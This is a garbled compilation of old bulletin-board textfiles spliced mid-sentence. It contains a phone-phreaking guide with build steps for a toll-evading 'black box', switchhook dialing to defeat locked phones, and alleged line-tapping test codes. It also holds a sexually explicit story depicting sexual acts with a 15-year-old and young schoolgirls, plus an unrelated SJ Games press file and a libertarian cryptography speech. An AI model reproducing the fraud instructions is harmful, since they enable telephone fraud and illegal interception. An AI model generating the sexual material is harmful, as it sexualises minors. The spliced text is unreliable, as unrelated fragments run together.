at  D B. To  say the  least, they  weren't exactly thrilled about  it. In  fact,  they did  not even believe   that  they   had  a   security  problem!  Well, that just  goes to  prove that  if you  are good, no one knows that you are there!    In  a big  effort to  defeat us,  they called in  an  outside   service  to spruce  up   their  security.   Well,  fortunately  for  us,  we were able to find out  about  the new  system!   Which wasn't  really a problem. First, they had the new dial ups when you  logged on, and  as always  they have  a nice little place on Telenet!  Where we do most of our work  C 20188 .       Now, they  have  set  up a  new  system  they like  to  call DunsNet. They  are trying  to pass it off as a ectionately call this mute a black box.  the following are instructions on how to build a simple black box.  Of course, anything that prevents the voltage from dropping would work.  You only need two parts   A SPST toggle switch and a 10,000 ohm  10 K , 1 2 watt resistor.  Any electronics store should stock these parts.  Now, cut 2 pieces of wire  about 6 inches long  and attach one end of each wire to one of the terminals on the switch.  Now turn your K500  standard desk fone  upside down and take off the cover. Locate wire  disconnect it from its terminal .  Now bring the switch out the rear of the fone and replace the cover.  Put the switch in a position where you receive a dial tone.  Mark this position NORMAL.  Mark the other side FREE.  When your phriends call  at a prearranged time , quickly lift   drop the receiver as fast a possible.  This will stop the ringing  do it again if it doesn't  with out starting the billing.  It is important that you do it quickly  less than 1 second . Then put the switch in the FREE position and pick up the fone.  Keep all calls short and preferrably under 15 minutes.  NOTE   If someone picks up an extension in the called parties house and        that fone is not set for FREE then billing will start.  NOTE   An old way of signalling a phriend that you are about to call is making        a collect call to a non existant person in the house.  Since your friend        will not accept the charges, he will know that you are about to call        and thus prepare the black box  or visa versa .  WARNING   The Telco can detect black boxes if they suspect one on your line.           This is done due to the presence of AC voice signal at the wrong DC           level!

NOTE   The Black Box will not work under ESS or other similar digital switches        since ESS does not connect the voice circuits until the fone is picked        up    billing starts .  Instead, ESS uses an  artificial  computer        generated ring.  Ringing            To inform a subscriber of an incoming call, the Telco sends 90 volts  PK  of pulsing DC down the line  at around 15 to 60 Hz  usually 20 Hz .  In most fones this causes a metal armature to be attracted alternately between two electro magnets thus striking 2 bells. of course, the standard bell  patented in 1878 by Tom A. Watson  can be replaced by a more modern electronic bell or signaling device.  Also, you can have lights and other similar devices in lieu of  or in conjunction with  the bell.  A simple neon light  with its corresponding resistor  can simply be connected between the red   green wires  usually L1   L2 on the network box  so that it lights up on incoming calls.  WARNING   90 VDC can give quite a shock. Exercise extreme caution if you wish           to further persue these topics.  Also included in the ringing circuit is a capacitor tbig  savings of time since the  hassle of  using a a time  shared public network does not exist. We're sure that Mr. J.W.P. of DUNSPRINT had more  on his mind when he wrote the letter  on the system ! DunsNet  is  accessible  from  a  regular dial up.  We have  not been  able to  get a number yet for  this system,  but  once on  it allegedly works  just like Telenet! Two carriage returns and you will see  DunsNet   then  the  familiar      symbol. To use the system like we showed you, type  RPTS  at  thiup to drop a trouble card for long periods of ringing then a  no no  detection device may be placed on the line.  Incidentally, the term  ring trip  refers to the CO process involved to stop the AC ringing signal when the calling fone goes off hook.  NOTE   It is suggested that you actually dissect fones to help you better        understand them. It will also help you to better understand the concepts        here if you actually prove them to yourself.  For example, actually        take the voltage readings on your fone line  any simple        multi tester  a must  will do.  Phreaking is an interactive        process not a passive one!  Dialing            On a standard fone, there are two common types of dialing   pulse   DTMF.  Of course, some people insist upon being different and don't use the DT thus leaving them with MF  Multi Frequncy, aka operator, blue box  tones.  This is another  no no  and the Telco Security gentelmen have a special knack for dealing with such  phreaks  on the network.  When you dial rotary, you are actually rapidly breaking   reconnecting  breaking   making  the local loop once for each digit dialed. Since the physical connection must be broken, you cannot dial if another extension  of that    is off hook.  Neither of the fones will be able to dial pulse unless the other hangs up.  Another term often referred to in telephone electronics is the break ratio.  In the US, the standard is 10 pulses per second.  When the circuit is opened it is called the break interval. When it is closed it is called the make interval. In the US, there is a 60 millisecond  ms  make period and a 40 ms break period.  60 40 100 ms   1 10 second .  This is referred to as a 60  make interval. Some of the more sophisticated electronic fones can switch between a 60    a 67  make interval.  This is due to the fact that many foreign nations use a 67  break interval.  Have you ever been in an office or a similar facility and saw a fone waiting to be used for a free call but some asshole put a lock on it to prevent outgoing calls   Well, don't fret phellow phreaks, you can simulate pulse dialing by rapidly depressing the switchook.   If you depress it for longer than a second it will be construed as a disconnect.   By rapidly switchooking you are causing the local loop to be broken   made similar to rotary dialing!  Thus if you can manage to switchook rapidly 10 times you can reach an operator to place any call you want!  This takes alot of practice, though.  You might want to practice on your own fone dialing a friend's   or something else. Incidentally, this method will also work with DTMF fones since all DTMF lines can also handle rotary.  Another problem with pulse dialing is that it produces high voltage spikes that make loud clicks in the earpiece and cause the bell to  tinkle.   If you never noticed this then your fone has a special  anti tinkle    earpiece shorting circuit  most do .  If you have ever dissected a rotary fone  a must for any serious phreak  you would have noticed that there are 2 sets of contact that open and close during pulsing  on the back of the rotary dial under the plastic cover .  One of these actually opens and closes the loop while the other mutes the earpiece by shorting it out.  The second contacts also activates a special anti tinkle circuit that puts a 340 ohm resistor across the ringing circuit which prevents the high voltage spikes from interferring with the bell.  Dual Tone Multi Frequency  DTMF  is a modern day improvement on pulse dialing in several ways.  First of all, it is more convenient for the user since it is faster and can be used for signaling after the call is completed  ie, SCC's, computers, etc. .  Also, it is more up to par with modern day switching equipment  such as ESS  since pulse dialing was designed to actually move relays by the number of digits dialed  in SxS offices .  Each key on a DTMF keypad produces 2 frequencies simultaneously  one from the high group and another from the low group .                                      Low Group !  Q  ! ABC !

The fourth column  1633 Hz  is not normally found on regular fones but it does have several special uses.  For one, it is used to designate the priority of calls on AUTOVON, the military fone network.  These key are called   Flash, Immediate, Priority,   Routine  with variations  instead of ABCD.  Secondly, these keys are used for testing purposes by the Telco.  In some area you can find loops as well as other neat tests  see Part II  on the 555 1212 directory assistance exchange. For this, you would call up an DA in certain areas  that have an Automatic Call Distributor  ACD   and hold down the  D  key which should blow the operator off.  You will then hear a pulsing dial tone which indicates that you are in the ACD internal testing mode.  You can get on one side of a loop by dialing a 6.  The other side is 7.  Some phreaks claim that if the person on side 6 hangs up, occasionally the equipment will screw up and start directing directory assistance calls to the other side of the loop. Another alleged test is called REMOB which allows you to tap into lines by entering a special code followed by the 7 digit number you want to monitor. Then there is the possibility of mass conferencing.  ACD's are become rare though.  You will probably have to make several NPA 555  1212 calls before you find one.  You can modify regular fones quite readily so that they have a switch to change between the 3rd and 4th columns. This is called a silver box  aka grey box  and plans can be found in Tap as well as on many BBS's.  Transmitter Receiver                         When you talk into the transmitter, the sound waves from your voice cause a diaphragm to vibrate and press against the carbon granules  or another similar substance .  This causes the carbon granules to compress and contract thus changing the resistance of the DC coupled path through it.  Therefore, your AC voice signal is superimposed over the DC current of the local loop. The receiver works in a similar fashion where the simple types utilize a magnet, armature,   diaphragm.  Hybrid Induction Coil                          As you may have noticed, there are two wires for the receiver and two for the transmitter in the fone, yet the local loop consists of 2 wires instead of 4. This 4 wire to 2 wire conversion is done inside the fone by a device known as an induction coil which uses coupling transformers.  All of the internal Telco trunks also use 4 wires. It is only the local loop that uses 2 since it is cheaper.  A device in the CO known as a hybrid converts between 4 and 2 wire set ups similar to the induction coil inside the fone. Special data transmission lines require extremely low signal to noise ratios, they require the full four wires  two for transmission and two for receiving  even on the local loop .  Miscellaneous                  In the telephone, there is also a balancing network consisting of a few capacitors   resistors which provide sidetone.  Sidetone allows the caller to hear his own volume in the receiver. He can then adjust his voice accordingly. This prevents people from shouting or speaking too softly without noticing it.  Hold   When a telephone goes off hook, the resistance drops below 2500 ohms.  At this point, the Telco will send a dial tone.  To put someone on hold you must put a 1000 ohm resistor  1 watt  across the Tip   Ring before it reaches the switchook.  In this way, when the fone is hung up  for hold  the resistance remains below 2500 ohms which causes the CO to believe that you are still off hook.  You can build a simple hold device using the following pictoral diagram                                              RED  O                                L1        !             !      !                !             !      !            1000 Ohm          !      !

To make a hold mute switch, simple connect a wire in place of the 1K resistor to effect a short circuit  who cares if you damage CO equipment  .

This file contains explicit sexual material, so dont jack off on the keyboard...             My life had been very boring and drab.  My subscription to Penthouse and National Lampoon were about to expire so my life had no meaning.  I had been working mowing lawns, trying to get enough money to buy a hard drive... since my ex girl friend told me that hard things were nicer than floppy ones. My parents were in California for US '84.  My dad posted a note on the local college job board that he needed a baby sitter to watch his 15 year old son and sit by the pool and suntan.  We got many phone calls.  My babysitter's name was known to me only as  34 24 33 .           The first days of my stay alone with the star of Debbie Does Dallas was pretty boring  since it was that time of month and I am not a vampire . The third day of my stay, my baby sitter sat down and told me that she had fantasies of molesting younge 15 year old boys who she babysits for.  She then proceeded to fufill our fate by sticking her soft hands down my pants and unzipping me.  She took off her shirt and bra, slacks and panties then leaned over and told me she wanted to whisper sweet nothings in my rear.           She told me she had seen this on a Cheech and Chong movie.  I  naturally went along with the fantasy.  She took off my pants and placed my 'joint' into her vibrating mouth.  As soon as she began to choke, she  turned her head up and told me that she had one more fantasy to fufill with  me.  I said that I would do anything for her.  She tied me to the bed with  these handcuffs she had ripped off a fucking cop.  She proceeded to spank me and kept calling me 'bad boy'.  Then, the little nympho took out a lighter and set my cock on fire and told me not to smoke.         As I began to burn, I could faintly see her molesting my pet gerbil while smoking a banana peel  which happened to be my pecker .  I saw a violent light, then a rainbow in the dark.         I was dead and in Heaven.  I, being an active atheist, didnt believe a damn thing about this.  I saw some gates and opened them and proceeded to go through the bars.  A man with a cane stopped me and told me he could answer  any questions I had about Heaven.  I proceeded to ask,  Sir, if I lived a good life and kept Kosher, helped little old ladies across the street, do you think I could get a cute little angel to piss on my face every Thursday night in  Heaven     The man immediately hit me in the balls with the cane and said,   There is no sex or corruption in Heaven, we all sit around and meditate while listening to Culture Club tapes.   I said,  Fuck this shit man, I  absofuckinglutley dont want to spend my eternity in this fag joint.   I then left the gates and jumped into oblivion through the clouds.            I fell through the sky and felt the earth seal around me.  I began to hear some faint music!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! I ran towards the music and heard some Ozzy Ozbourne, Crazy Train Playing. I immediately screamed  Now this is more fucking like it!   I took out my pack of Menthol Players and lit it from the fire still pertruding from my cock. A lady with extremely large breasts welcomed me into my new home.  I saw men orgying in the fire laden streets with beautiful women.  I jumped on a 21  year old woman and started gangbanging her with my cock of fire.  She stood up and screamed,  Why's your cock on fire    I told her my plight and she told me to go to Satan's wife.         I entered Satan's wife's house and signed the guest register.  I  ran up to her room where she was actively masturbating with a broom stick. I said  wow!!  She looked up in ecstacy and and asked me what she could do for me.  I blushed.  She said,  Besides that!   I told her of my story.  She said she could help me quench the fires, but I would have to pledge my life to  winning over the virginity of younge school girls.  She placed my cock in her mouth and the fire was quenched by our ecstacy.         I asked her what her name was in my last breath of passion.  She said it was Lita Ford.  I asked her if the lady who set my cock on fire back on  earth was one of her followers.  She said her name was Wendy O. Williams. I said  wow!!!!   After having another engagement of oral sex with her  steaming clit, I was wisped away to the land of virginity and high school  girls.         I found myself in a private school for young rich snobby girls.  My new identity was Angus.  I had no last name, but never questioned the intent of my master's wife.         I first began to hunt out my prey with the high school cheerleaders. But, after noticing that they stuck to the floor while doing to splits, I  decided to go for less virtile girls.  I seduced a young girl whose face reminded me of an ancient memory.  I took her up to my apartment and she said she needed help with her geometry.  I showed her my obtuse angle and she  showed me her acute one.  As I tore off her bra, I noticed how undeveloped she was.  I took off her greasy panties and began to tounge her love channel. She started to moan and said she couldnt believe I was doing that to her.  I  just told her to sit back and relax.  As I licked her wet spot, I noticed her erect nipples and the tiny dew drops forming around her clit.  I tounge fucked her for 15 minutes then started to push my shaft up her.  She started to moan with pleasure.  I proceeded to tie her to the bed with a pair of hot handcuffs which I had borrowed from Wendy.  I forced my victim's head down over my  pulsating dong.  She began to gag a familiar gag.  I let her head up for air for a moment.  Then to my surprise, she stuck her tounge out and it was  flaming.  I said  oh, shit, not again!!!   She set my dick on fire.         As I proceeded to go back to my mistress in the underworld of sex, I began to think of how good it would feel to get my pecker's fire quenched  again by Satan's wife's cool pulsating tounge.  I entered Hell for a second  time and everybody greeted me with praises and started begging for sexual vibrators to be sold in Hell for a lower price.  I said  Why ask me    They told me it was all a test to see who would be the new number two.  I began to understand, as I remembered the ancient lyrics of an Iron Maiden song named  The Prisoner.   I lit another Play X  oceeded to my master's  flaming house in the depths of sex.  I entered and Satan bowed down and kissed my hand.  He said I am the new number two since he is getting a little too old to get his cock sucked on anymore by his wife.  I took the position gladly.           I realized my new position.  I am SATAN!!!!! I have unlimited powers!! I begin to lead unsuspecting virgin girls to my domain.  I conquer earth with my flaming nympho's.  I proceed to climb up the ladder of Heaven and gang bang all the ladies there and say,  You could have been doing this all your life instead of living in misery trying to draft more people into your false  faith!!!!!!!   I then pick up my brand new electric gibson challenger with new tremelo bar and customized locking bolts with the perfect distortion.  I  yelled the ancient and foreshadowing lyrics of my coming into power...              Heaven's on Fire!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!                                                                                       this is my life and this is my story...the next man you see caught on fire  could be me predicting my rule over all and the sexual reign on earth, hell, and heaven.                                               psycoe                                           the keeper of the                                          cock of fire!!!!!                                                                                    death to all prudes and nonsexual pussy rockers!!!!!

"top10.news",4272,4272,61.49,3.08,25.87,"nd.","nd.","nd.","textfile","THE TOP TEN MEDIA ERRORS ABOUT THE SJ GAMES RAID      updated 2 12 92   As this story has developed, occasional errors creep into news stories   and many of them have taken on a life of their own. Some reporters, working from their clipping files, have turned out stories that are almost 100  free of facts. There are a lot of those floating around . . .  but here are our Top Ten.   10. Steve Jackson Games is a computer game company.     No we're not. None of our games are computer games. We use computers to WRITE the games, like every other publisher in the '90s. And the game that was seized, GURPS CYBERPUNK, was about computers. But we're not a computer game company any more than George Bush is a gardener.   9. GURPS Cyberpunk is a computer game.     No it's not. Aieeeeee! It's a roleplaying game. It is not played on a computer. It's played on a table, with dice.   8. We're out of business.     No we're not. It's been reported that we are bankrupt, or filing for bankruptcy. It was very close, and we're not out of the woods by any means   we did have to lay off half our staff after the raid  . . . but we're not dead yet.   7. We were raided by the FBI.     No we weren't. We were raided by the US Secret Service. The FBI had nothing to do with it.  In fact, when Bill Cook, the assistant US attorney named in our suit, was doing his  research,  he talked to the FBI. They told him he didn't have a case. We have this from FBI sources!    6. Some of our staff members were arrested by the Secret Service and charged with hacking.     No they weren't. No member of our staff was arrested, indicted, or charged. Nobody was even QUESTIONED after the day of the raid.   5. This was part of Operation Sun Devil.     No it wasn't. Sun Devil was a totally separate project, aimed at credit card fraud. Because it had a neat name, it got a lot of headlines. Since computers were involved, some reporters got the two confused. The Secret Service helped the confusion along by refusing to comment on what was, or wasn't part of Sun Devil. Sun Devil was not a  hacker  investigation. So says Gail Thackeray, who was its spearhead.   4. The raid was after GURPS Cyberpunk.     No it wasn't. The Secret Service suspected one of our staffers of wrongdoing, using his computer at home. They had nothing connecting his alleged misdeeds with our office, but they raided us anyway, and took a lot of things. One of the things they took was the GURPS Cyberpunk manuscript. Their agents were very critical of it, and on March 2 in their office, one of them called it a  handbook for computer crime.  Since their warrant was sealed, and they wouldn't comment, our best guess was that they were trying to suppress the book. They did suppress it, but apparently it was through bureaucratic inertia and stonewalling rather than because it was a target of the raid. Unfortunately, they let us believe for 7 months  until their warrant affidavit was unsealed  that they had been after the book.   3. There was a hacker threat to sabotage the 911 system.     No there wasn't. This story has been cynically spread by phone company employees  who know better  and by Secret Service spokesmen  who probably believe it, because they still don't understand any of this . They're using this story to panic the media, to try to justify the illegal things they've done and the huge amount of money they've spent.     What happened was this  A student got access to a phone company computer and copied a text file   not a program. This file was nothing but administrative information, and was publicly available elsewhere. Bell South tried to value it at  79,000, but in court they admitted that they sold copies for under  20. There was no way this file could be used to hurt the 911 system, even if anybody had wanted to. To say otherwise shows an incredible ignorance of the facts. It's as though a banker claimed  This criminal made an illegal copy of the list of our Board of Directors. He can use that to break into our vault.    2. GURPS Cyberpunk was written by Lloyd Blankenship.     He spells his name Loyd, with one L.   And the Number One  false fact  ever reported about this story . . .   1. Steve Jackson Games is the second largest game company in the USA.     Don't we wish! "

Organization  Extropy Institute Reply To  whitaker eternity.demon.co.uk Date  Wed, 28 Oct 1992 13 17 28  0000    FROM CROSSBOWS TO CRYPTOGRAPHY   THWARTING THE STATE VIA                      TECHNOLOGY     Given at the Future of Freedom Conference, November 1987          You   know,   technology  and   particularly   computer technology  has often gotten a bad rap in  Libertarian  cir  cles.  We tend to think of Orwell's 1984, or Terry Gilliam's Brazil,  or  the  proximity  detectors keeping East Berlin's slave citizens on their own side of the border, or  the  so  phisticated  bugging  devices  Nixon used to harass those on his  enemies list.   Or, we recognize that for the price  of a  ticket  on  the Concorde we can fly at twice the speed of sound, but only if we first walk thru a magnetometer run  by a  government  policeman, and permit him to paw thru our be  longings if it beeps.        But I think that mind set is a mistake.   Before  there were cattle prods, governments tortured their prisoners with clubs  and  rubber  hoses.    Before  there  were lasers for eavesdropping, governments used binoculars and  lip readers. Though  government certainly uses technology to oppress, the evil lies not in the tools but in the wielder of the tools.        In fact, technology represents one of the most  promis  ing  avenues  available  for  re capturing our freedoms from those who have stolen them.  By its very nature,  it  favors the  bright   who can put it to use  over the dull  who can  not .  It favors the adaptable  who are  quick  to  see  the merit  of  the  new   over  the sluggish  who cling to time  tested ways .  And what two better words are  there  to  de  scribe government bureaucracy than  dull  and  sluggish          One  of  the  clearest,  classic triumphs of technology over tyranny I see is  the  invention  of  the  man portable crossbow.   With it, an untrained peasant could now reliably and lethally engage a target out to  fifty  meters  even  if that  target  were  a mounted, chain mailed knight.   Unlike the longbow, which, admittedly was more powerful, and  could get  off  more shots per unit time, the crossbow required no formal training to utilize.   Whereas the  longbow  required elaborate  visual,  tactile  and kinesthetic coordination to achieve any degree of accuracy, the wielder  of  a  crossbow could simply put the weapon to his shoulder, sight along the arrow  itself, and be reasonably assured of hitting his tar  get.         Moreover, since just about  the  only  mounted  knights likely  to  visit  your  average peasant would be government soldiers and tax collectors, the utility of the  device  was plain     With it, the common rabble could defend themselves not only against one another, but against their governmental masters.   It was the  medieval  equivalent  of  the  armor  piercing  bullet,  and, consequently, kings and priests  the medieval equivalent of a  Bureau  of  Alcohol,  Tobacco  and Crossbows   threatened  death  and  excommunication, respec  tively, for its unlawful possession.        Looking at later developments, we  see  how  technology like  the  firearm  particularly the repeating rifle and the handgun, later followed by the Gatling gun and more advanced machine guns  radically altered the balance of interpersonal and inter group power.  Not without reason was the Colt  .45 called  the equalizer.   A frail dance hall hostess with one in  her  possession  was  now  fully able to protect herself against the brawniest roughneck in any saloon.    Advertise  ments  for  the period also reflect the merchandising of the repeating cartridge  rifle  by  declaring  that   a  man  on horseback,  armed with one of these rifles, simply cannot be captured.   And, as long as his captors  were  relying  upon flintlocks  or  single shot rifles, the quote is doubtless a true one.        Updating now to  the  present,  the  public key  cipher  with  a  personal  computer to run it  represents an equiv  alent quantum leap  in a defensive weapon.    Not  only  can such  a technique be used to protect sensitive data in one's own possession, but it can also permit two strangers to  ex  change   information   over   an   insecure   communications channel  a  wiretapped   phone   line,   for   example,   or skywriting, for that matter   without ever having previously met  to  exchange cipher keys.   With a thousand dollar com  puter, you can create a cipher that  a  multi megabuck  CRAY X MP  can't  crack in a year.  Within a few years, it should be economically feasible to similarly encrypt voice communi  cations  soon after that, full color digitized video images. Technology will not only have made wiretapping obsolete,  it will  have  totally demolished government's control over in  formation transfer.        I'd like to take just a moment to sketch the  mathemat  ics  which makes this principle possible.  This algorithm is called the RSA algorithm, after Rivest, Shamir, and  Adleman who  jointly created it.  Its security derives from the fact that, if a very large number is  the  product  of  two  very large  primes,  then it is extremely difficult to obtain the two prime factors from analysis  of  their  product.     Ex  tremely   in  the  sense that if primes  p  and  q  have 100 digits apiece, then their 200 digit product cannot  in  gen  eral be factored in less than 100 years by the most powerful computer now in existence.        The   public  part of the key consists of  1  the prod  uct  pq  of the two large primes p and q, and  2   one  fac  tor,  call it  x  , of the product  xy  where  xy     p 1     q 1    1 .  The  private  part of the key consists  of  the other factor  y.        Each  block of the text to be encrypted is first turned into an integer  either by using ASCII,  or  even  a  simple A 01,  B 02,  C 03, ... , Z 26 representation.  This integer is then raised to the power  x  modulo pq  and the resulting integer is then sent as the encrypted message.  The receiver decrypts by taking this integer to the   secret   power    y  modulo  pq .  It can be shown that this process will always yield the original number started with.        What makes this a groundbreaking development,  and  why it  is  called   public key   cryptography,   is  that I can openly publish the product  pq and the number   x   ,  while keeping  secret  the number  y    so that anyone can send me an encrypted message, namely                        x                      a     mod pq   , but only I can recover the original message  a  , by  taking what  they  send, raising it to the power  y  and taking the result  mod pq .  The risky step  meeting to exchange cipher keys  has been eliminated.  So people who may not even trust each other enough to want to meet, may  still  reliably  ex  change  encrypted  messages  each  party having selected and disseminated his own  pq  and his  x  ,   while  maintaining the secrecy of his own  y.        Another benefit of this scheme is the notion of a  dig  ital signature,  to enable one to authenticate the source of a given message.  Normally, if I want to send you a message, I raise my plaintext  a  to your x and take the result   mod your pq   and send that.       However,  if in my message, I take the plaintext  a and raise it to my  secret  power  y  , take the result   mod my pq , then raise that result to your x    mod  your  pq   and send this, then even after you have normally  decrypted  the message,  it  will still look like garbage.  However, if you then raise it to my public power x   , and take  the  result  mod  my public pq   , so you will not only recover the ori  ginal plaintext message, but you will know that no one but I could have sent it to you  since no one else knows my secret y .        And these are the very concerns by the way that are to  day tormenting the Soviet Union about the whole question  of personal  computers.    On the one hand, they recognize that American schoolchildren are right now growing up  with  com  puters  as commonplace as sliderules used to be  more so, in fact, because there are things computers can do  which  will interest   and instruct  3  and 4 year olds.  And it is pre  cisely these students who one generation hence will be going head to head against their Soviet  counterparts.    For  the Soviets  to  hold  back might be a suicidal as continuing to teach swordsmanship  while  your  adversaries  are  learning ballistics.    On  the  other hand, whatever else a personal computer may be, it is also an exquisitely efficient copying machine  a floppy disk will hold upwards of 50,000 words  of text,  and  can  be  copied in a couple of minutes.  If this weren't threatening enough, the computer that  performs  the copy  can also encrypt the data in a fashion that is all but unbreakable.  Remember that in Soviet society  publicly  ac  cessible  Xerox  machines are unknown.    The relatively few copying machines in existence  are  controlled  more  inten  sively than machine guns are in the United States.         Now  the   conservative  position is that we should not sell these computers to the Soviets, because they could  use them  in weapons systems.  The  liberal  position is that we should sell them, in  the  interests  of  mutual  trade  and cooperation  and  anyway,  if  we don't make the sale, there will certainly be some other nation willing to.        For my part, I'm ready to suggest that the  Libertarian position should be to give them to the Soviets for free, and if  necessary, make them take them . . . and if that doesn't work load up an SR 71  Blackbird  and  air  drop  them  over Moscow in the middle of the night.  Paid for by private sub  scription, of course, not taxation . . . I confess that this is not a position that has gained much support among members of  the conventional left right political spectrum, but, af  ter all, in the words of one of Illuminatus's characters, we are political non Euclideans    The shortest distance  to  a particular  goal may not look anything like what most people would consider a  straight line.     Taking  a  long  enough world view,  it is arguable that breaking the Soviet govern  ment monopoly on information transfer could better  lead  to the enfeeblement and, indeed, to the ultimate dissolution of the Soviet empire than would the production of another dozen missiles aimed at Moscow.        But  there's  the rub   A  long enough  world view does suggest that the evil, the oppressive, the coercive and  the simply  stupid  will  get what they deserve,  but what's not immediately clear is how the rest of  us  can  escape  being killed, enslaved, or pauperized in the process.       When  the  liberals and other collectivists began to at  tack freedom, they possessed a reasonably  stable,  healthy, functioning economy, and almost unlimited time to proceed to hamstring   and   dismantle  it.    A  policy  of  political gradualism was at least  conceivable.    But  now,  we  have patchwork  crazy quilt  economy held together by baling wire and spit.  The state not only taxes us to   feed  the  poor  while also inducing farmers to slaughter milk cows and drive up food prices  it then simultaneously turns around and sub  sidizes research into agricultural chemicals designed to in  crease  yields of milk from the cows left alive.  Or witness the fact that a decline in the price of oil is considered as potentially frightening as a comparable increase a few years ago.  When the price went up,  we  were  told,  the  economy risked  collapse for for want of energy.  The price increase was called the  moral equivalent of war  and the Feds  swung into  action.    For the first time in American history, the speed at which you drive your car to work in the morning be  came an issue of Federal concern.   Now, when the  price  of oil  drops, again we risk problems, this time because Ameri  can oil companies and Third World  basket case  nations  who sell  oil  may  not  be  able to ever pay their debts to our grossly over extended banks.  The suggested panacea is  that government  should now re raise the oil prices that OPEC has lowered, via a new oil tax.  Since the government is seeking to raise oil prices to about the same extent  as  OPEC  did, what  can we call this except the  moral equivalent of civil war  the government against its own people          And, classically, in international trade, can you imag  ine any entity in the world except  a  government  going  to court  claiming  that  a  vendor  was  selling  it goods too cheaply and demanding not only that that naughty  vendor  be compelled by the court to raise its prices, but also that it be punished for the act of lowering them in the first place         So  while the statists could afford to take a couple of hundred years to trash our  economy  and  our  liberties  we certainly  cannot  count  on  having an equivalent period of stability in which to reclaim them.   I contend  that  there exists  almost  a   black  hole   effect in the evolution of nation states just as in the evolution of stars.  Once free  dom contracts beyond a certain  minimum  extent,  the  state warps  the fabric of the political continuum about itself to the degree that subsequent re emergence of  freedom  becomes all but impossible.  A good illustration of this can be seen in the area of so called  welfare  payments.  When those who sup  at the public trough outnumber  and thus outvote  those whose taxes must replenish the trough,  then  what  possible choice has a democracy but to perpetuate and expand the tak  ing  from  the few for the unearned benefit of the many   Go down to the nearest  welfare  office, find just  two  people on  the dole . . . and recognize that between them they form a voting bloc that can forever outvote you on  the  question of who owns your life  and the fruits of your life's labor.        So essentially those who love liberty need an  edge  of some  sort  if  we're ultimately going to prevail.  We obvi  ously  can't  use  the  altruists'   other directedness   of  work,  slave, suffer, sacrifice, so that next generation of a billion random strangers can  live  in  a  better  world.  Recognize  that, however immoral such an appeal might be, it is nonetheless an extremely powerful one in today's culture. If you can convince  people  to  work  energetically  for  a  cause,  caring only enough for their personal welfare so as to  remain  alive  enough  and  healthy  enough  to continue working  then you have a truly massive reservoir  of  energy to draw from.  Equally clearly, this is just the sort of ap  peal which tautologically cannot be utilized for egoistic or libertarian goals.  If I were to stand up before you tonight and say something like,  Listen, follow me as I enunciate my noble  cause,  contribute your money to support the  cause,  give  up  your  free  time  to  work for the  cause,  strive selflessly to bring it about, and then  after you  and  your children are dead  maybe your children's children will actu  ally  live under egoism   you'd all think I'd gone mad.  And of course you'd be right.  Because the point I'm  trying  to make is that libertarianism and or egoism will be spread if, when, and as, individual libertarians and or egoists find it profitable and or enjoyable to do so.    And  probably  only then.        While I certainly do not disparage the concept of poli  tical  action, I don't believe that it is the only, nor even necessarily the most cost effective path  toward  increasing freedom  in  our time.  Consider that, for a fraction of the investment in time, money and effort I might expend in  try  ing  to  convince  the  state to abolish wiretapping and all forms of censorship  I can teach every libertarian who's in  terested  how  to   use   cryptography   to   abolish   them unilaterally.        There  is  a  maxim  a proverb  generally attributed to the Eskimoes, which very likely most Libertarians  have  al  ready  heard.    And while you likely would not quarrel with the saying, you might well feel that you've heard  it  often enough already, and that it has nothing further to teach us, and moreover, that maybe you're even tired of hearing it.  I shall therefore repeat it now         If you give a man a fish, the saying runs, you feed him for a day.  But if you teach a man how to fish, you feed him for a lifetime.        Your exposure to the quote was probably in some sort of a   workfare   vs.   welfare   context   namely, that if you genuinely wish to help someone in need, you should teach him how to earn his sustenance, not simply how to  beg  for  it. And of course this is true, if only because the next time he is hungry, there might not be anybody around willing or even able to give him a fish, whereas with the information on how to fish, he is completely self sufficient.        But  I  submit  that this exhausts only the first order content of the quote, and if there were nothing  further  to glean  from  it,  I would have wasted your time by citing it again.  After all, it seems to have almost a crypto altruist slant, as though to imply that we should structure  our  ac  tivities  so  as  to  maximize  the  benefits to such hungry beggars as we may encounter.        But consider         Suppose this Eskimo doesn't know how to  fish,  but  he does  know  how  to hunt walruses.   You, on the other hand, have often gone hungry while traveling thru  walrus  country because  you  had  no idea how to catch the damn things, and they ate most of the fish you could catch.  And now  suppose the  two  of  you  decide to exchange information, bartering fishing knowledge for hunting knowledge.   Well,  the  first thing  to  observe  is  that  a  transaction  of  this  type categorically and unambiguously refutes the Marxist  premise that  every  trade  must  have a  winner  and a  loser   the idea that if one person gains, it must necessarily be at the  expense  of another person who loses.  Clearly, under  this scenario, such is not the case.  Each party has gained some  thing  he  did  not have before, and neither has been dimin  ished in any way.  When it comes to exchange of  information  rather  than material objects  life is no longer a zero sum game.  This is an extremely powerful notion.   The   law  of diminishing   returns,    the   first  and  second  laws  of thermodynamics   all those  laws  which constrain our possi  bilities in other contexts  no longer bind us!   Now  that's anarchy!        Or  consider  another possibility   Suppose this hungry Eskimo never learned  to  fish  because  the  ruler  of  his nation state    had  decreed fishing illegal.   Because fish contain dangerous tiny bones, and sometimes sharp spines, he tells us, the state has decreed that their  consumption  and even  their  possession  are  too  hazardous to the people's health to be permitted . . . even by knowledgeable,  willing adults.   Perhaps it is because citizens' bodies are thought to be government property, and therefore it is the  function of the state to punish those who improperly care for govern  ment  property.    Or perhaps it is because the state gener  ously extends to competent adults the  benefits  it provides to children and to the mentally ill   namely,  a  full time, all pervasive supervisory conservatorship  so that they need not  trouble  themselves  with making choices about behavior thought physically risky or morally  naughty.   But, in  any case,  you  stare stupefied, while your Eskimo informant re  lates how this law is taken so seriously that  a  friend  of his was recently imprisoned for years for the crime of  pos  session of nine ounces of trout with intent to distribute.         Now  you  may  conclude  that  a society so grotesquely oppressive as to enforce a law of this  type  is  simply  an affront to the dignity of all human beings.  You may go far  ther  and  decide to commit some portion of your discretion  ary, recreational time specifically to the task of thwarting this tyrant's goal.   Your rationale may be  altruistic   in the   sense   of  wanting  to  liberate  the  oppressed,  or  egoistic  in the sense of  proving  you  can  outsmart  the oppressor  or  very likely some combination of these or per  haps even other motives.         But, since you have zero desire to become a  martyr  to your  cause,  you're not about to mount a military campaign, or  even try to run a boatload of fish through the blockade. However, it is here that technology  and in  particular  in  formation technology  can multiply your efficacy literally a hundredfold.    I say  literally,  because for a fraction of the effort  and virtually none of  the  risk   attendant  to smuggling in a hundred fish, you can quite readily produce a hundred  Xerox copies of fishing instructions.   If the tar  geted government, like present day America, at least permits open  discussion  of  topics  whose  implementation  is  re  stricted,  then that should 